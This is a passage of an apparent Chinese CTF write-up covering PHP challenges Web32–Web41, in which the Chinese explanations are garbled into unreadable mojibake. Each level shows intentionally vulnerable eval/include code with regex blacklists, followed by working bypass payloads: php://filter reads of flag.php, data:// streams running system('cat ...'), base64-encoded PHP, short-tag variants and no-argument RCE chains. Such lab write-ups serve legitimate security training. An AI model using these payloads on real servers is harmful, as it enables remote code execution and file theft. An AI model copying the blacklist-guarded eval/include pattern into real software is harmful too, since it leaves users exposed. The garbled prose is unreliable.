å´å¯ä»¥è‡ªç”±çš„å‘ä¸Šå‘ä¸‹ç¿»é¡µï¼Œä¹Ÿå¯ä»¥è‡ªç”±çš„å‘ä¸Šå‘ä¸‹æœç´¢æŒ‡å®šå­—ç¬¦ä¸²ã€‚</span><br><span class="line">head:æŸ¥çœ‹å¤´å‡ è¡Œ</span><br><span class="line">tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º</span><br><span class="line">tail:æŸ¥çœ‹å°¾å‡ è¡Œ</span><br><span class="line">nlï¼šå‘½ä»¤çš„ä½œç”¨å’Œ cat -n ç±»ä¼¼ï¼Œæ˜¯å°†æ–‡ä»¶å†…å®¹å…¨éƒ¨æ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼Œå¹¶ä¸”æ˜¯ä»ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼ŒåŒæ—¶ä¼šè‡ªåŠ¨æ‰“å°å‡ºè¡Œå·ã€‚</span><br><span class="line">od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹</span><br><span class="line">vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</span><br><span class="line">vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</span><br><span class="line">sort:å¯ä»¥æŸ¥çœ‹</span><br><span class="line">uniq:å¯ä»¥æŸ¥çœ‹</span><br><span class="line">file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹ã€‚å¯ä»¥åˆ©ç”¨æŠ¥é”™å°†æ–‡ä»¶å†…å®¹å¸¦å‡ºæ¥ï¼ˆ-f&lt;åç§°æ–‡ä»¶&gt; ã€€æŒ‡å®šåç§°æ–‡ä»¶ï¼Œå…¶å†…å®¹æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶åç§°æ—¶ï¼Œè®©fileä¾åºè¾¨è¯†è¿™äº›æ–‡ä»¶ï¼Œæ ¼å¼ä¸ºæ¯åˆ—ä¸€ä¸ªæ–‡ä»¶åç§°ã€‚ï¼‰</span><br></pre></td></tr></table></figure><h1 id="web32"><a class="markdownIt-Anchor" href="#web32">#</a> Web32ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº† system å’Œåå¼•å·è¿˜æœ‰ echoï¼Œè¿™é‡Œçœ‹ä¼¼æŒºä¸¥æ ¼çš„ï¼Œä½†æ˜¯ print_r æˆ–è€… var_dump æ²¡æœ‰è¿‡æ»¤ï¼Œåº”è¯¥å¯ä»¥åˆ©ç”¨ä¸‹ï¼Œä½†æ˜¯ï¼Œsystem è¢«è¿‡æ»¤äº†ï¼Œåªæœ‰æ— å›æ˜¾ RCE äº†ï¼Œä½†æ˜¯ï¼Œè¿‡æ»¤äº†å·¦åŠè¾¹æ‹¬å·ï¼Œè¿™æ ·å°±æ²¡æ³•ç»•äº†ï¼Œè¯•ä¸€è¯•ä¸éœ€è¦æ‹¬å·çš„è¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">die</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;etc/passwd&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹<strong>å¯ä»¥é…åˆæ–‡ä»¶åŒ…å«æ¥æ‰“ä¼ªåè®®ï¼Œå…·ä½“ payload ç±»ä¼¼ä¸‹é¢è¿™æ ·ï¼š</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include&quot;<span class="built_in">$</span><span class="built_in">_</span>GET[url]&quot;?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web33"><a class="markdownIt-Anchor" href="#web33">#</a> Web33ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹å¤šè¿‡æ»¤äº†åˆ†å·å’ŒåŒå¼•å·ï¼Œåå¼•å·å’Œç©ºæ ¼ç­‰ç­‰ä¾ç„¶è¢«è¿‡æ»¤äº†ï¼Œè¿™ä¸ªæ—¶å€™ä¼¼ä¹æ›´éš¾åŠäº†ï¼Œè¿˜æ˜¯æ‰“æ–‡ä»¶åŒ…å«åŠ ä¼ªåè®®æ¥æ‰“ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web34"><a class="markdownIt-Anchor" href="#web34">#</a> Web34ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹å¤šè¿‡æ»¤äº†ä¸€ä¸ªå†’å·ï¼Œæ–¹æ³•åŒä¸Šï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œè§£é‡Šä¸€ä¸‹ï¼Œè¿™é‡Œå‡ºç°å†’å·ä¾æ—§ç»•è¿‡äº†çš„åŸå› æ˜¯å› ä¸º PHP æŠŠå‰é¢çš„ include åˆ°ï¼Ÿ&gt; çš„è®¤ä¸ºæˆä¸€ä¸ª get ä¼ å‚ï¼Œå¦ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯ &amp; url è¢«è®¤ä¸ºæ˜¯å¦ä¸€ä¸ªä¼ å‚ï¼Œæ­£åˆ™åªæ£€æµ‹ç¬¬ä¸€ä¸ªéƒ¨åˆ†ï¼Œç¬¬äºŒä¸ªéƒ¨åˆ†å°±ä¸ä¼šæ£€æµ‹äº†ã€‚</p><h1 id="web35"><a class="markdownIt-Anchor" href="#web35">#</a> Web35ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹å°äºç¬¦å·ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡æ— ä¼¤å¤§é›…ï¼Œä¾æ—§è€æ ·å­ï¼Œå› ä¸ºæ²¡æœ‰è¿‡æ»¤ &gt;ï¼Œæ‰€ä»¥ä¾æ—§èƒ½ç”¨ä¸Šé¢çš„ payload æ‰“ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web36"><a class="markdownIt-Anchor" href="#web36">#</a> Web36ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œè¿å¸¦ç€æ•°å­—ä¸€èµ·è¿‡æ»¤äº†ï¼Œæ— ä¼¤å¤§é›…ï¼Œç»§ç»­æ–‡ä»¶åŒ…å«ä¸€æŠŠæ¢­ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web37"><a class="markdownIt-Anchor" href="#web37">#</a> Web37ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹æ–‡ä»¶åŒ…å«è¿‡æ»¤äº† flagï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è€ƒè™‘ include ä¸€ä¸ª data ä¼ªåè®®è¾“å…¥çš„å‘½ä»¤å‚æ•°ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><blockquote><p>data://ï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„ data:// æµä¼šè¢«å½“ä½œ php æ–‡ä»¶æ‰§è¡Œ</p></blockquote><p>â€‹<strong>ç¬¬ä¸€ï¼šä½¿ç”¨é€šé…ç¬¦ç»•è¿‡ flagï¼š</strong></p><blockquote><p>?c=data://text/plain,<?php echo system('cat fl*');?><br>?c=data://text/plain,<?php%20 system('cat fl*');?></p></blockquote><p>â€‹<strong>ç¬¬äºŒï¼šä½¿ç”¨ base64 ç»•è¿‡ flagï¼š</strong></p><blockquote><p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p><p>#base64 è§£ç ä¸º <code>&lt;?php system('cat flag.php');?&gt;</code></p></blockquote><h1 id="web38"><a class="markdownIt-Anchor" href="#web38">#</a> Web38ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹ç›¸è¾ƒäºä¸Šä¸€ä¸ªé¢˜å¤šè¿‡æ»¤äº†ä¸€å±‚ phpï¼Œä½¿ç”¨ base64 ç»•è¿‡å°±è¡Œï¼š</p><blockquote><p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p></blockquote><p>â€‹æˆ–è€…ï¼Œä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼š</p><blockquote><p>?c=data://text/plain,<?= system("tac fla?.???");?></p></blockquote><h1 id="web39"><a class="markdownIt-Anchor" href="#web39">#</a> Web39ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº† flagï¼Œä½†æ˜¯æ–‡ä»¶åŒ…å«é‡Œå­˜åœ¨.php çš„åç¼€ï¼Œå¥½åƒæ— ä¼¤å¤§é›…ï¼Œå’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼ŒçŸ­æ ‡ç­¾æ‰“ã€‚</p><blockquote><p>/?c=data://text/plain,<?= system("tac fla?.???");?></p></blockquote><p>â€‹ç”±äºä¸¤ç«¯åˆåœ¨ä¸€èµ·å°±ç±»ä¼¼äº <code>&lt;?= system('tac fla*');?&gt;.php</code> ï¼Œ.php å› ä¸ºå·²ç»è¢«æ ‡ç­¾é—­åˆåœ¨å¤–é¢ï¼Œæ‰€ä»¥ä¸ä¼šè¢«å½“ä½œæ–‡ä»¶åŒ…å«çš„åç¼€ç®—è¿›å»ï¼Œä¾æ—§èƒ½è¿›è¡Œ RCEã€‚</p><h1 id="web40"><a class="markdownIt-Anchor" href="#web40">#</a> Web40ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº†æ•°å­—ï¼Œå’Œå„ç§ç¬¦å·ï¼Œä½†æ˜¯è¿‡æ»¤ä¼¼ä¹æœ‰ç‚¹å„¿é—®é¢˜ï¼Œæ²¡æœ‰è¿‡æ»¤è‹±æ–‡çš„æ‹¬å·ï¼Œè¿‡æ»¤æˆäº†ä¸­æ–‡çš„æ‹¬å·ï¼Œæ‰€ä»¥ï¼Œæ— å‚æ•° RCEï¼Œå¯ä»¥ä¸€æŠŠæ¢­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p>â€‹å‰ç½®çŸ¥è¯†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">localeconv</span>()ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚å…¶ä¸­æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªä¸ºç‚¹å·(.)</span><br><span class="line"><span class="title function_ invoke__">current</span>() ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ï¼›é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼</span><br><span class="line"><span class="title function_ invoke__">pos</span>()ï¼š<span class="title function_ invoke__">current</span>() çš„åˆ«å</span><br><span class="line"><span class="title function_ invoke__">reset</span>() å°† <span class="keyword">array</span> çš„å†…éƒ¨æŒ‡é’ˆå€’å›åˆ°ç¬¬ä¸€ä¸ªå•å…ƒå¹¶è¿”å›ç¬¬ä¸€ä¸ªæ•°ç»„å•å…ƒçš„å€¼ã€‚</span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>()ï¼šæ•°ç»„é€†åº</span><br><span class="line">(å¦‚æœä¸æ˜¯æ•°ç»„çš„æœ€åä¸€ä¸ªæˆ–è€…å€’æ•°ç¬¬äºŒä¸ªå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>())ï¼Œ<span class="title function_ invoke__">array_flip</span>()æ˜¯äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼ï¼Œ<span class="title function_ invoke__">array_rand</span>()æ˜¯éšæœºè¿”å›ä¸€ä¸ªæ•°ç»„)</span><br><span class="line"><span class="title function_ invoke__">scandir</span>()ï¼šåˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•</span><br><span class="line"><span class="title function_ invoke__">next</span>()ï¼šå‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä½å³æŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºè¿™ä¸ªå…ƒç´ ã€‚</span><br></pre></td></tr></table></figure><p>â€‹æˆ–è€…ä½¿ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶</span><br><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)));</span><br><span class="line">æ‰¾åˆ°flag.php</span><br><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)))));</span><br><span class="line">é«˜äº®æ˜¾ç¤ºå³å¯</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)))));</span><br></pre></td></tr></table></figure><h1 id="web41"><a class="markdownIt-Anchor" href="#web41">#</a> Web41ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹æ— å­—æ¯æ•°å­— RCEï¼Œå¹¶ä¸”å› ä¸ºè¿‡æ»¤äº† $ã€+ã€-ã€^ã€~ æ‰€ä»¥æ— 